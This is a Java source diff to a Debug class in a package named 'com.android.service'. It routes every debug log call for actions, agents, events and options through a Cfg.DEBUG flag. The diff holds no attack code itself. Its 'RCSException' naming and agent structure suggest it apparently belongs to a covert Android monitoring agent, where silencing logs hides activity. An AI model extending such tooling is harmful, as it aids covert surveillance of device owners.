@@ -13,8 +13,7 @@ import com.android.service.action.Action;
 import com.android.service.action.SubAction;
 import com.android.service.agent.AgentConf;
 import com.android.service.agent.AgentType;
-import com.android.service.auto.AutoConfig;
-import com.android.service.conf.Configuration;
+import com.android.service.auto.Cfg;
 import com.android.service.conf.Option;
 import com.android.service.event.EventConf;
 
@@ -56,29 +55,29 @@ public class Debug {
 	public static void StatusActions() {
 		final Status status = Status.self();
 
-		Log.d("QZ", TAG + " DEBUG - Status Actions Begins");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " DEBUG - Status Actions Begins");
 
 		try {
 			for (int i = 0; i < status.getActionsNumber(); i++) {
 				final Action a = status.getAction(i);
 
-				Log.d("QZ", TAG + " Action Id: " + a.getId() + " sub num: "
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Action Id: " + a.getId() + " sub num: "
 						+ a.getSubActionsNum());
 
 				for (int j = 0; j < a.getSubActionsNum(); j++) {
 					final SubAction s = a.getSubAction(j);
 
-					Log.d("QZ", TAG + "  -> SubAction " + j + " Type: "
+					if(Cfg.DEBUG) Log.d("QZ", TAG + "  -> SubAction " + j + " Type: "
 							+ s.getSubActionType() + " Params len: "
 							+ s.getSubActionParams().length);
 				}
 			}
 		} catch (final GeneralException rcse) {
-			if (AutoConfig.DEBUG) { rcse.printStackTrace(); }
-			Log.d("QZ", TAG + " RCSException detected in Debug.StatusActions()");
+			if (Cfg.DEBUG) { rcse.printStackTrace(); }
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " RCSException detected in Debug.StatusActions()");
 		}
 
-		Log.d("QZ", TAG + " DEBUG - Status Actions Ends");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " DEBUG - Status Actions Ends");
 	}
 
 	/**
@@ -87,7 +86,7 @@ public class Debug {
 	public static void StatusAgents() {
 		final Status status = Status.self();
 
-		Log.d("QZ", TAG + " DEBUG - Status Agents Begins");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " DEBUG - Status Agents Begins");
 
 		int agentsNumber = status.getAgentsNumber();
 
@@ -95,7 +94,7 @@ public class Debug {
 					try {
 				final AgentConf a = status.getAgent(at);
 
-				Log.d("QZ", TAG + " Agent Id: " + a.getId() + " Params len: "
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Agent Id: " + a.getId() + " Params len: "
 						+ a.getParams().length);
 			} catch (final GeneralException rcse) {
 				// No need to print that this agent doesn't exist
@@ -103,7 +102,7 @@ public class Debug {
 			}
 		}
 
-		Log.d("QZ", TAG + " DEBUG - Status Agents Ends");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " DEBUG - Status Agents Ends");
 	}
 
 	/**
@@ -112,20 +111,20 @@ public class Debug {
 	public static void StatusEvents() {
 		final Status statusObj = Status.self();
 
-		Log.d("QZ", TAG + " DEBUG - Status Events Begins");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " DEBUG - Status Events Begins");
 
 		for (int i = 0; i < statusObj.getEventsNumber(); i++) {
 			try {
 				final EventConf e = statusObj.getEvent(i);
 
-				Log.d("QZ", TAG + " Event Id: " + e.getId() + " Event Type: "
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Event Id: " + e.getId() + " Event Type: "
 						+ e.getType() + " Params len: " + e.getParams().length);
 			} catch (final GeneralException rcse) {
 				// No need to print that this agent doesn't exist
 			}
 		}
 
-		Log.d("QZ", TAG + " DEBUG - Status Events Ends");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " DEBUG - Status Events Ends");
 	}
 
 	/**
@@ -134,7 +133,7 @@ public class Debug {
 	public static void StatusOptions() {
 		final Status statusObj = Status.self();
 
-		Log.d("QZ", TAG + " DEBUG - Status Options Begins");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " DEBUG - Status Options Begins");
 
 		int optionsNumber = statusObj.getOptionssNumber();
 
@@ -145,7 +144,7 @@ public class Debug {
 				final Option o = statusObj.getOption(Option.CONFIGURATION + i
 						+ 1);
 
-				Log.d("QZ", TAG + " Option Id: " + o.getId() + " Option Type: "
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Option Id: " + o.getId() + " Option Type: "
 						+ " Params len: " + o.getParams().length);
 			} catch (final GeneralException rcse) {
 				// No need to print that this agent doesn't exist
@@ -153,7 +152,7 @@ public class Debug {
 			}
 		}
 
-		Log.d("QZ", TAG + " DEBUG - Status Options Ends");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " DEBUG - Status Options Ends");
 	}
 
 	/**
@@ -165,7 +164,7 @@ public class Debug {
 	@Deprecated
 	public void trace(final String string) {
 		if (enabled) {
-			Log.d(name, string);
+			if(Cfg.DEBUG) Log.d(name, string);
 		}
 	}
 
@@ -178,7 +177,7 @@ public class Debug {
 	@Deprecated
 	public void error(final Exception ex) {
 		if (enabled) {
-			Log.d(name, "ERROR: " +ex.toString());
+			if(Cfg.DEBUG) Log.d(name, "ERROR: " +ex.toString());
 		}
 	}
 
@@ -191,7 +190,7 @@ public class Debug {
 	@Deprecated
 	public void error(final String string) {
 		if (enabled) {
-			Log.d(name,"ERROR: " + string);
+			if(Cfg.DEBUG) Log.d(name,"ERROR: " + string);
 		}
 	}
 
@@ -203,7 +202,7 @@ public class Debug {
 	 */
 	public void warn(final String string) {
 		if (enabled) {
-			Log.d(name, "WARN: " + string);
+			if(Cfg.DEBUG) Log.d(name, "WARN: " + string);
 		}
 	}
 
@@ -216,7 +215,7 @@ public class Debug {
 	@Deprecated
 	public void info(final String string) {
 		if (enabled) {
-			Log.d(name, "INFO: " + string);
+			if(Cfg.DEBUG) Log.d(name, "INFO: " + string);
 		}
 	}
 
@@ -229,7 +228,7 @@ public class Debug {
 	@Deprecated
 	public void fatal(final String string) {
 		if (enabled) {
-			Log.d(name, "FATAL: " + string);
+			if(Cfg.DEBUG) Log.d(name, "FATAL: " + string);
 		}
 	}
 
